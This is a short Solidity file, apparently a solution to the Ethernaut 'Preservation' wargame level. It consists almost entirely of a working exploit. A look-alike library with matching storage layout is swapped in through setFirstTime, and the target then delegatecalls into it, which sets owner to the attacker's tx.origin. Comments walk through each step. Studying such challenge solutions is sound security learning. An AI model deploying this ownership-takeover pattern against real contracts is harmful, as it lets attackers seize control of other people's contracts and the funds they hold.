pragma solidity ^0.7.3;

interface IPreservation {
    function setFirstTime(uint _timeStamp) external;
}

// this one will be called by delegatecall
contract PreservationAttackerLib {
    // needs same storage layout as Preservation, i.e.,
    // we want owner at slot index 2
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) public {
        owner = tx.origin;
    }
}

contract PreservationAttacker {
    IPreservation public challenge;
    PreservationAttackerLib public detour;

    constructor(address challengeAddress) {
        challenge = IPreservation(challengeAddress);
        detour = new PreservationAttackerLib();
    }
    
    function attack() external {
      // 1. change the library address to our evil detour lib
      // this works because their LibraryContract is invoked using delegatecall
      // which executes in challenge contract's context (uses same storage)
      challenge.setFirstTime(uint256(address(detour)));

      // 2. now make challenge contract call setTime function of our detour
      challenge.setFirstTime(0);
    }
}
